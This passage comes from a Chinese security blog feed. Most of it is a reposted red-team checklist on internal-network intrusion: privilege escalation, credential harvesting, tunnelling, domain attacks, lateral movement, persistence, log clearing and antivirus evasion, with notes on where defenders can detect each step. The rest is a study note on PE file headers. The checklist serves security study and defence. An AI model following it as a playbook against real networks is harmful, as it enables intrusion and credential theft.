<li>linux 内核漏洞 本地提权 [ linux-exploit-suggester ]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2016-5195					    [重点]</span><br><span class="line">CVE-2017-16995</span><br><span class="line">CVE-2019-13272</span><br></pre></td></tr></table></figure></li>
<li>利用各类第三方服务 / 软件工具提权<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mssql 						    [重点]</span><br><span class="line">Oracle         					    [重点]</span><br><span class="line">Mysql</span><br><span class="line">各类第三方软件dll劫持 				    [重点]</span><br><span class="line">suid权限                        </span><br><span class="line">计划任务</span><br><span class="line">各种错误服务配置利用</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x06-内网安全-敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行"><a href="#0x06-内网安全-敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行" class="headerlink" title="0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]"></a>0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]</h3><ul>
<li>搜集当前已控”跳板机”的各类敏感信息<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述</span><br><span class="line"></span><br><span class="line">查看当前shell权限 及 详细系统内核版本</span><br><span class="line">获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip</span><br><span class="line">获取当前系统最近的用户登录记录</span><br><span class="line">获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置... ]</span><br><span class="line">获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息</span><br><span class="line">获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 ]</span><br><span class="line">获取本机 rdp / ssh 端口开启状态 及 其默认端口号</span><br><span class="line">获取本机所有用户的rdp外连记录</span><br><span class="line">获取本机的所有SSH登录记录</span><br><span class="line">获取当前系统所有登录成功的日志 [ 针对windows ]</span><br><span class="line">获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]</span><br><span class="line">获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录</span><br><span class="line">获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]</span><br><span class="line">获取当前用户 桌面 及 回收站 里的所有文件列表</span><br><span class="line">获取当前系统的所有存在suid权限的二进制程序</span><br><span class="line">获取当前系统代理 [ ip &amp; 端口 ]</span><br><span class="line">获取当前系统所有的自启动注册表项值</span><br><span class="line">获取当前系统的所有 ipc 连接 及 已启用共享</span><br><span class="line">获取当前系统的所有挂载[mount]</span><br><span class="line">获取当前系统的防火墙状态</span><br><span class="line">获取当前系统所有分区/盘符及其详细使用情况</span><br><span class="line">获取本机的累计开机时长</span><br><span class="line">获取本机arp / dns缓存</span><br><span class="line">获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby...等语言的执行环境,后期可设法利用 ]</span><br><span class="line">获取当前系统所有本地用户及组列表</span><br><span class="line">获取当前系统host文件内容</span><br><span class="line">获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]</span><br><span class="line">远程截屏捕捉目标用户敏感操作</span><br><span class="line"></span><br><span class="line">由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>利用当前已控 “跳板机”, 分析目标内网大致网络拓扑 及 所有关键性业务机器分布 </p>
</li>
<li><p>批量抓取内网所有windows机器名 和 所在 “域” / “工作组名” [smb探测扫描]</p>
</li>
<li><p>针对内网的各种高危敏感服务定位[“安全” 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]</p>
</li>
<li><p>内网批量 Web Banner 抓取,获取关键目标业务系统如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内网各种文件[共享]服务器</span><br><span class="line">内网各类web服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网各类数据库服务器</span><br><span class="line">内网邮件服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网Vpn服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti...</span><br><span class="line">内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端...</span><br><span class="line">内网日志服务器</span><br><span class="line">内网补丁服务器</span><br><span class="line">内网各类OA,ERP,CRM,SRM,HR系统... </span><br><span class="line">内网打印服务器</span><br><span class="line">内网 MES 系统 </span><br><span class="line">内网虚拟化服务器 / 超融合平台 [Vmware ESX]</span><br><span class="line">内网堡垒机...</span><br><span class="line">内网运维,研发 部门员工的机器</span><br><span class="line">内网路由,交换设备...</span><br><span class="line">等等等...</span><br><span class="line"></span><br><span class="line">针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现</span><br><span class="line">通过在一些关键节点设备/服务器上部署探针搜集流量</span><br><span class="line">再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的</span><br></pre></td></tr></table></figure></li>
<li><p>针对各类已知系统高危RCE漏洞的批量探测识别与利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]</span><br><span class="line">MS17-010</span><br><span class="line">CVE-2019-0708</span><br><span class="line"></span><br><span class="line">其实针对此类漏洞的攻击利用识别,就显得比较直白了</span><br><span class="line">通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型 流量特征 和 系统日志即可大致判断</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x07-内网安全-各类敏感凭证-“搜集”-与-“窃取”"><a href="#0x07-内网安全-各类敏感凭证-“搜集”-与-“窃取”" class="headerlink" title="0x07 内网安全  [ 各类敏感凭证 “搜集” 与 “窃取” ]"></a>0x07 内网安全  [ 各类敏感凭证 “搜集” 与 “窃取” ]</h3><ul>
<li><p>主动密码搜集 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的</span><br><span class="line">此处不再赘述, 此项非防御重点, 因为压根也不好防</span><br><span class="line"></span><br><span class="line">批量抓取当前机器上的 &quot;各类基础服务配置文件中保存的各种账号密码&quot;</span><br><span class="line">   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...</span><br><span class="line">想办法 &quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;</span><br><span class="line">   比如, *.ls,*.doc,*.docx, *.txt....</span><br><span class="line">抓取各类 &quot;数据库客户端工具中保存各种数据库连接账号密码</span><br><span class="line">   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</span><br><span class="line"></span><br><span class="line">抓取当前系统 &quot;注册表中保存的各类账号密码hash&quot; [ Windows ]</span><br><span class="line">抓取当前系统所有 &quot;本地用户的明文密码/hash&quot; [ Windows &amp; linux ]</span><br><span class="line">抓取当前系统的所有 &quot;用户token&quot; [ Windows ]</span><br><span class="line">抓取 &quot;windows凭据管理器中保存的各类连接账号密码&quot;</span><br><span class="line">抓取 &quot;MSTSC 客户端中保存的所有rdp连接账号密码&quot;</span><br><span class="line">抓取各类 &quot;VNC客户端工具中保存的连接密码&quot;</span><br><span class="line">抓取 &quot;GPP目录下保存的各类账号密码&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]</span><br><span class="line">抓取各类 &quot;SSH客户端工具中保存的各种linux系统连接账号密码&quot;, SecureCRT,Xshell,WinSCP,putty</span><br><span class="line">抓取各类 &quot;浏览器中保存的各种web登录密码&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器</span><br><span class="line">抓取各类 &quot;数据库表中保存的各类账号密码hash&quot;</span><br><span class="line">抓取各类 &quot;FTP客户端工具中保存的各种ftp登录账号密码&quot;, filezila, xftp...</span><br><span class="line">抓取各类 &quot;邮件客户端工具中保存的各种邮箱账号密码&quot;, forxmail, thunderbird...</span><br><span class="line">抓取各类 &quot;SVN客户端工具中保存的所有连接账号密码及项目地址&quot;</span><br><span class="line">抓取各类 &quot;VPN客户端工具中保存的各种vpn链接账号密码&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>被动密码搜集 [ 等着管理员自己来送密码 ] </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]</span><br><span class="line"></span><br><span class="line">Windows SSP [持久化/内存]</span><br><span class="line">Hook PasswordChangeNotify [持久化/内存]</span><br><span class="line">OWA 登录账号密码截获</span><br><span class="line">截获mstsc.exe中输入的rdp连接账号密码</span><br><span class="line">linux 别名记录利用</span><br><span class="line">本机明文密码嗅探 [ http,ftp,pop3... ]</span><br><span class="line">传统键盘记录</span><br><span class="line">windows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]</span><br></pre></td></tr></table></figure></li>
<li><p>Hash爆破:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hashcat [ 完全拼GPU ] </span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x08-内网安全-内网常用-“隧道””-“转发””-“代理””-穿透手法-提炼汇总-，防御重点"><a href="#0x08-内网安全-内网常用-“隧道””-“转发””-“代理””-穿透手法-提炼汇总-，防御重点" class="headerlink" title="0x08 内网安全 [ 内网常用 “隧道”” / “转发”” / “代理”” 穿透手法 提炼汇总 ，防御重点 ]"></a>0x08 内网安全 [ 内网常用 “隧道”” / “转发”” / “代理”” 穿透手法 提炼汇总 ，防御重点 ]</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">出网流量刺探</span><br><span class="line">比如,http,dns,以及一些穿透性相对较好的tcp端口... </span><br><span class="line">这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器</span><br><span class="line"></span><br><span class="line">常规 HTTP脚本代理</span><br><span class="line">abptts,Neo-reGeorg,reGeorg,tunna,reduh...</span><br><span class="line">不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行</span><br><span class="line"></span><br><span class="line">SSH 隧道</span><br><span class="line">加密端口转发,socks 实战用途非常灵活,此处不细说 ]</span><br><span class="line"></span><br><span class="line">Rdp 隧道</span><br><span class="line"></span><br><span class="line">反向SOCKS</span><br><span class="line">nps, frp, ssf, CobaltStrike(socks4a &amp; rportfwd ), sscoks ... </span><br><span class="line">工具基本都不免杀了,需要自行处理</span><br><span class="line"></span><br><span class="line">正反向TCP 端口转发</span><br><span class="line">非常多,就不一一列举, eg: nginx,netsh,socat,ew....</span><br><span class="line"></span><br><span class="line">DNS加密隧道			</span><br><span class="line"></span><br><span class="line">Web端口复用</span><br><span class="line"></span><br><span class="line">需要明白的是,在一般的红队场景中</span><br><span class="line">入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性</span><br></pre></td></tr></table></figure>

<h3 id="0x09-域内网安全-域内常用攻击手法-域渗透-，提炼汇总，防御重点"><a href="#0x09-域内网安全-域内常用攻击手法-域渗透-，提炼汇总，防御重点" class="headerlink" title="0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]"></a>0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]</h3><ul>
<li><p>针对当前域的一些常规信息搜集[ 其实现实中,只需要一个BloodHound &amp; Pingcastle足矣,就是工具需要自行事先免杀好]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前域内的完整域管列表</span><br><span class="line">获取当前域内的所有域控机器名列表</span><br><span class="line">获取当前域内的所有DNS服务器机器名列表</span><br><span class="line">获取当前域内的所有SPN</span><br><span class="line">获取当前域内的所有OU</span><br><span class="line">获取当前域内的所有用户 &amp; 用户组列表</span><br><span class="line">获取当前域信任关系 [ 跨域渗透 ]</span><br><span class="line">获取当前域内所有机器的开机时间</span><br><span class="line">获取当前域内网段及web站点</span><br><span class="line">获取当前域内策略 [ 主要是为了了解密码策略 ]</span><br><span class="line">获取当前域林</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></li>
<li><p>快速获取目标域控权限的一些常规手法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ] </span><br><span class="line">服务票据hash破解(&quot;尤其是域管用户的&quot;) [ kerberoast ]</span><br><span class="line">批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]</span><br><span class="line">Kerberos 委派利用</span><br><span class="line">爆破LDAP</span><br><span class="line">Exchange特定ACL滥用</span><br><span class="line">SSP 截获关键服务器登录密码</span><br><span class="line">利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞... ],在内网循环抓各类密码,直至</span><br><span class="line">  抓到域管密码</span><br><span class="line">  抓到域管令牌</span><br><span class="line">DNSAdmin 组成员滥用 [ 加载执行恶意dll ]</span><br><span class="line">LAPS</span><br><span class="line">MS14-068 [ 如今实际中已很少遇到了 ]</span><br><span class="line">LLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]</span><br></pre></td></tr></table></figure></li>
<li><p>域内后渗透敏感信息搜集分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取所有DNS记录</span><br><span class="line">导出当前域的完整LDAP数据库</span><br><span class="line">提取当前域的ntds.dit [ 域内账号密码数据库 ]</span><br><span class="line">  Dcsync同步</span><br><span class="line">  Volume Shadow Copy Service</span><br></pre></td></tr></table></figure></li>
<li><p>域内指定用户登录ip定位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用OWA登录日志</span><br><span class="line">利用域控服务器登录日志</span><br><span class="line">指定服务银票 [ Silver Ticket ]</span><br><span class="line">除此之外,就是下面的各类常规横向手法</span><br></pre></td></tr></table></figure></li>
<li><p>域内指定用户机器定向控制技巧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绑定用户登录脚本</span><br><span class="line">利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]</span><br><span class="line">PTT [ 票据传递 ]</span><br></pre></td></tr></table></figure></li>
<li><p>针对域管的各种权限维持技巧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">金票</span><br><span class="line">Skeleton Key</span><br><span class="line">DSRM密码同步</span><br><span class="line">OWA后门</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li><p>域内Exchange 邮件数据脱取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用Ews接口通过PTH的方式脱邮件</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x10-内网安全-跨平台横向渗透-远程执行-，防御重点-“重中之重”"><a href="#0x10-内网安全-跨平台横向渗透-远程执行-，防御重点-“重中之重”" class="headerlink" title="0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( “重中之重” ) ]"></a>0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( “重中之重” ) ]</h3><ul>
<li><p>从 Windows平台 横向至  Windows平台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限</span><br><span class="line"></span><br><span class="line">远程服务管理 [ SCM ]</span><br><span class="line">远程创建执行计划任务 [ Scheduled Tasks ]</span><br><span class="line">WMI 远程执行 [ WMI ]</span><br><span class="line">针对高版本Windows 的WinRM 远程执行 </span><br><span class="line">DCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]</span><br><span class="line">高版本 RDP 远程执行</span><br><span class="line">利用MSSQL数据库存储过程来变相远程执行</span><br><span class="line">利用Oracle数据库存储过程来变相远程执行</span><br><span class="line">SMB [ PTH (hash传递) ]</span><br><span class="line">RDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]</span><br><span class="line">利用补丁服务器下发执行</span><br><span class="line">利用EDR主控端定向下发执行</span><br></pre></td></tr></table></figure></li>
<li><p>从 Windows平台 横向至 Linux平台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plink 或者 基于Windows SSH库自行开发各种远程执行小工具</span><br></pre></td></tr></table></figure></li>
<li><p>从 linux平台 横向至 Windows 平台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下</span><br><span class="line">wmiexec_linux_x86_64</span><br><span class="line">smbexec_linux_x86_64</span><br><span class="line">psexec_linux_x86_64</span><br><span class="line">atexec_linux_x86_64</span><br><span class="line">dcomexec_linux_x86_64</span><br><span class="line"></span><br><span class="line">另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行</span><br></pre></td></tr></table></figure></li>
<li><p>从 linux平台 横向至 linux 平台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行</span><br></pre></td></tr></table></figure></li>
<li><p>各种远程下载技巧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget [ win &amp; linux ]</span><br><span class="line">curl [ win &amp; linux ]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道</span><br><span class="line">某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可</span><br><span class="line"></span><br><span class="line">CertUtil.exe</span><br><span class="line">Bitsadmin.exe</span><br><span class="line">Regsvr32.exe</span><br><span class="line">Rundll32.exe</span><br><span class="line">Powershell.exe</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x11-内网安全-权限维持，防御重点-注-有些细节此处并未展开详细说明"><a href="#0x11-内网安全-权限维持，防御重点-注-有些细节此处并未展开详细说明" class="headerlink" title="0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]"></a>0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]</h3><ul>
<li><p>边界入口权限维持</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OWA 登录口 [ 账号密码,webshell ]</span><br><span class="line">VPN 登录口 [ 账号密码,shell ]</span><br><span class="line">其他 MAIL 登录口 [ 账号密码 ]</span><br><span class="line">边界 Web服务器 [ Webshell 驻留技巧 ]</span><br><span class="line">边界路由交换设备 [ 账号密码,shell ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li><p>Windows 单机系统维持 [临时]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统计划任务 [ 高权限/低权限 ]</span><br><span class="line">常规注册表自启动项 [ 用户权限/system权限 ]</span><br><span class="line">Mssql存储过程 [ 继承服务权限 ]</span><br><span class="line">WMI</span><br><span class="line">Winlogon</span><br><span class="line">CLR</span><br><span class="line">Logon Scripts</span><br><span class="line">MruPidlList</span><br><span class="line">Mof</span><br><span class="line">传统远控</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>linux 单机系统维持 [临时]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Patch SSH</span><br><span class="line">替换各类基础服务so [ PAM,Nginx,Rsync ...] </span><br><span class="line">系统计划任务</span><br><span class="line">传统应用层远控</span><br><span class="line">驱动层远控( 针对特定内核版本 )</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x12-痕迹处理"><a href="#0x12-痕迹处理" class="headerlink" title="0x12 痕迹处理"></a>0x12 痕迹处理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web日志 [ 访问, 错误日志 ]</span><br><span class="line">数据库日志 [ 异常连接日志,慢查询日志 ]</span><br><span class="line">系统各类安全日志 [ ssh,rdp,smb,wmi,powershell....]</span><br><span class="line">各类邮箱登录日志</span><br><span class="line">域内敏感攻击利用日志 [ 金票,银票... ]</span><br><span class="line">此项为专业蓝队范畴,不再赘述</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h3 id="0x13-各类常用-C2-渗透-框架"><a href="#0x13-各类常用-C2-渗透-框架" class="headerlink" title="0x13 各类常用 C2 / 渗透 框架"></a>0x13 各类常用 C2 / 渗透 框架</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CobaltStrike [二次开发]</span><br><span class="line">  payload(beacon) 逆向/改进重写</span><br><span class="line">Metasploit [二次开发]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h3 id="0x14-各类常用-Webshell管理工具"><a href="#0x14-各类常用-Webshell管理工具" class="headerlink" title="0x14 各类常用 Webshell管理工具"></a>0x14 各类常用 Webshell管理工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">菜刀	</span><br><span class="line">冰蝎	</span><br><span class="line">蚁剑	</span><br><span class="line">哥斯拉</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h3 id="0x15-免杀-及-各类防火墙对抗"><a href="#0x15-免杀-及-各类防火墙对抗" class="headerlink" title="0x15 免杀 及 各类防火墙对抗"></a>0x15 免杀 及 各类防火墙对抗</h3><ul>
<li><p>静态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">混淆:</span><br><span class="line">手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等....</span><br><span class="line">工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">加壳:</span><br><span class="line">一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]</span><br><span class="line">最好的方式还是尝试自己写壳,就是成本较高</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li><p>动态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反射</span><br><span class="line">shellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )</span><br><span class="line">白利用</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">注:</span><br><span class="line">   理论上, 这些应该也没有什么非常通用的方法</span><br><span class="line">   大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药</span><br></pre></td></tr></table></figure></li>
<li><p>流量:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域前置[利用大厂cdn]</span><br><span class="line">DNS加密隧道</span><br><span class="line">第三方公共邮箱上线</span><br><span class="line">第三方网盘上线</span><br><span class="line">第三方社交网站上线</span><br><span class="line">第三方匿名社交工具上线[eg: tg机器人,tor...]</span><br></pre></td></tr></table></figure></li>
</ul>
<p>原文链接：<a href="https://github.com/klionsec/RedTeamer">https://github.com/klionsec/RedTeamer</a></p>
]]></content>
      <categories>
        <category>转载</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>pe解析</title>
    <url>/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>去年学了一遍pe，但是没有用代码实现，导致对pe的理解非常浅，今年又重新学了一遍，旨在加强对代码的掌握，并不是从0开始，只是方便本人理解，因此笔记内容很残缺，可以参考去年的笔记一起看。</p>
<p>代码仓库：</p>
<p><a href="https://github.com/0range-x/windows/tree/main/pe">https://github.com/0range-x/windows/tree/main/pe</a></p>
<h2 id="PE头解析"><a href="#PE头解析" class="headerlink" title="PE头解析"></a>PE头解析</h2><p> 4gb = 2^32 ，寻址长度，</p>
<p>对齐的目的：查找速度更快，用空间换时间</p>
<p>硬盘对齐：200h</p>
<p>内存对齐：1000h</p>
<p>所以程序在内存执行的时候，会在内存中扩展。节和节之间用0填充。</p>
<p>dos头、pe头、pe可选头</p>
<h4 id="dos头"><a href="#dos头" class="headerlink" title="dos头"></a>dos头</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e_magic			//5A 4D</span><br><span class="line">e_lfanew 		//00 00 00 E8       pe头相对于文件的偏移，用于定位pe文件</span><br></pre></td></tr></table></figure>

<p>从e8开始就是pe开始的地方，对应的  50 45  对应的ascii字符是pe，</p>
<h4 id="NT-headers"><a href="#NT-headers" class="headerlink" title="NT_headers"></a>NT_headers</h4><p>包含signature+标准pe头(Image_File_Header)+<strong>可选pe头(IMAGE_OPTIONAL_HEADER)</strong></p>
<p> signature为50 45 00 00 ，找完后不找nt_headers，去找 Image_File_Header， </p>
<h5 id="Image-File-Header-标准PE头"><a href="#Image-File-Header-标准PE头" class="headerlink" title="Image_File_Header (标准PE头)"></a>Image_File_Header (标准PE头)</h5><p>大小确定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WORD		Machine					//86 64 	//可以在什么机器上运行 </span><br><span class="line">WORD		NumberOfSections		//07 00		//文件中存在的节的总数，如果要新增或者合并节需要修改该字段</span><br><span class="line">DWORD		TimeDateStamp			//2b 8c 95 22		//文件编译时间戳</span><br><span class="line"></span><br><span class="line">WORD		SizeOfOptionalHeader	//f0 00	 	可选pe头的大小，32位pe默认为E0h,64位pe为f0h，大小可以自定义</span><br></pre></td></tr></table></figure>





<h5 id="Image-Optional-Header-可选pe头"><a href="#Image-Optional-Header-可选pe头" class="headerlink" title="Image_Optional_Header(可选pe头)"></a>Image_Optional_Header(可选pe头)</h5><p>大小不确定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WORD		Magic						//0b 02   //10b为32位的文件，20b为64位的文件</span><br><span class="line">DWORD		SizeOfCode					//00 60 02 00</span><br><span class="line">DWORD		SizeOfInitializedData		//00 00 03 00</span><br><span class="line">DWORD		SizeOfUNinitializedData		//00 00 00 00</span><br><span class="line">DWORD		AddressOfEntryPoint			//90 1b 00 00		//程序入口  != 代码入口 ，程序在内存中真正的运行地址为   基址+oep (入口点)</span><br><span class="line"></span><br><span class="line">DWORD		BaseOfCode					//00 10 00 00</span><br><span class="line">DWORD		BaseOfData					//00 00 00 40</span><br><span class="line">DWORD		ImageBase					//01 00 00 00 		//内存映像基址</span><br><span class="line">DWORD		SectionAlignment			//00 10 00 00		//内存对齐，内存中整个pe文件的尺寸，可以比实际值大，但必须是SectionAlignment的整数倍</span><br><span class="line">DWORD		FileAlignment				//00 10 00 00		//文件对齐</span><br><span class="line">DWORD		SizeofImage					//00 70 05 00		//内存中 整个PE文件的映射的大小，可以比实际的值大，但必须是SectionAlignment的整数倍</span><br><span class="line">DOWRD		SizeofHeaders				//00 10 00 00		//所有头(DOS+...+PE标记+标准PE+可选PE)+节表 按照文件对齐后lao 否则加载会出错</span><br><span class="line">DWORD		SizeOfStackReverse			//00 00 08 00</span><br><span class="line">DWORD		SizeofStackCommit			//00 00 00 00</span><br><span class="line">DWORD		SizeOfHeapReverse			//00 10 01 00</span><br><span class="line">DWORD		SizeOfHeapCommit 			//00 00 00 00</span><br></pre></td></tr></table></figure>

<p>将pe文件从硬盘中读到内存中，是原封不动的读进去，拷贝到内存中，存储到 <code>FileBuffer</code>,但这个时候还没有办法运行，需要peloader修改 <code>FileBuffer</code>为内存中可执行的过程，就是内存拉伸的过程。写到的地址(内存运行的起始地址)叫<code>ImageBuffer</code>（文件映像）</p>
<p>修改OEP</p>
<p>pe后面的20个字节为标准pe头</p>
<p>剩下的为可选pe头，从0b 02 开始。  修改 <code>ImageBase</code>(程序入口点 EntryBase)，保存后程序仍然正常运行</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220925134144246.png" alt="image-20220925134144246"></p>
<h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>相当于节中的目录 描述  节中的概要信息</p>
<p>定位节表：</p>
<p>可选pe头的大小是不确定的，标准pe头里有个成员变量     <code>SizeofOptionalHeader</code> 表示可选pe头的大小，32位默认是 e0， 64位默认是 f0</p>
<p>dos+4+pe+可选pe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifanew + 4(signature) + 20(标准pe头大小) +E0(32位的 SizeOfOptionalHeader) </span><br></pre></td></tr></table></figure>

<p>Image_File_Header（标准pe） 里的 <code>NumberOfSections</code> 是节表的数量</p>
<p>pe后面的第二个成员，就是节表数量，这里是5个。</p>
<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220926143523309.png" alt="image-20220926143523309"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define IMAGE_SIZEOF_SHORT_NAME				8</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/image-20220926141455399.png" alt="image-20220926141455399"></p>
